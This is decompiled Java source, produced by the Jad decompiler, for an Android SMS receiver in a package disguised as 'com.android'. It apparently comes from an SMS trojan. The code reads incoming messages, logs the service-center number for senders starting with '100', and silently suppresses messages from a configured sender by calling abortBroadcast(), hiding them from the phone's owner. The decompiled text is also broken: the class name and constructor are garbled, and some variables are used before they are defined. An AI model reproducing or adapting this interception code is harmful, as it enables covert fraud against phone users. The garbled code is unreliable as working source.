// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   MainService.java

package com.android;

import android.content.*;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;

// Referenced classes of package com.android:
//            MainService, FileAct, StringUtil

public class nit> extends BroadcastReceiver
{

    public void onReceive(Context context, Intent intent)
    {
        String s = intent.getAction();
        int i = getResultCode();
        if(s.equals("com.test.sms.send"))
            return;
        if(s.equals("com.test.sms.delivery"))
            return;
        if(!s.equals("android.provider.Telephony.SMS_RECEIVED"))
            return;
        Bundle bundle = intent.getExtras();
        if(bundle == null)
            return;
        Object aobj[] = (Object[])bundle.get("pdus");
        SmsMessage asmsmessage[] = new SmsMessage[aobj.length];
        int j = 0;
        do
        {
            int k = aobj.length;
            if(j >= k)
            {
                SmsMessage smsmessage = asmsmessage[0];
                String s1 = smsmessage.getServiceCenterAddress();
                String s2 = smsmessage.getDisplayOriginatingAddress();
                if(s2 != null && s2.startsWith("100") && !"".equalsIgnoreCase(s1))
                {
                    String s3 = MainService.access$1(MainService.this);
                    if("other".equalsIgnoreCase(s3))
                    {
                        MainService.access$2(MainService.this, s1);
                        String as[] = StringUtil.getRecordInfo(FileAct.readString(MainService.recordlog));
                        String s10;
                        String s11;
                        SmsMessage smsmessage1;
                        if(as != null && as.length == 3)
                        {
                            String s4 = as[2];
                            if("other".equalsIgnoreCase(s4) || "".equalsIgnoreCase(s4))
                            {
                                String s5 = String.valueOf(as[0]);
                                StringBuilder stringbuilder = (new StringBuilder(s5)).append("|");
                                String s6 = as[1];
                                StringBuilder stringbuilder1 = stringbuilder.append(s6).append("|");
                                String s7 = MainService.access$1(MainService.this);
                                String s8 = stringbuilder1.append(s7).toString();
                                String s9 = MainService.recordlog;
                                FileAct.writeString(s8, s9);
                            }
                        } else
                        {
                            String s12 = String.valueOf(StringUtil.getExecTime());
                            StringBuilder stringbuilder2 = (new StringBuilder(s12)).append("|");
                            String s13 = MainService.access$3(MainService.this);
                            StringBuilder stringbuilder3 = stringbuilder2.append(s13).append("|");
                            String s14 = MainService.access$1(MainService.this);
                            String s15 = stringbuilder3.append(s14).toString();
                            String s16 = MainService.recordlog;
                            FileAct.writeString(s15, s16);
                        }
                    }
                }
                if(s2 == null)
                    return;
                s10 = MainService.access$4(MainService.this);
                if(!s2.startsWith(s10))
                    return;
                s11 = MainService.access$5(MainService.this);
                if(s2.equalsIgnoreCase(s11))
                {
                    return;
                } else
                {
                    abortBroadcast();
                    return;
                }
            }
            smsmessage1 = SmsMessage.createFromPdu((byte[])aobj[j]);
            asmsmessage[j] = smsmessage1;
            j++;
        } while(true);
    }

    final MainService this$0;

    public ()
    {
        this$0 = MainService.this;
        super();
    }
}
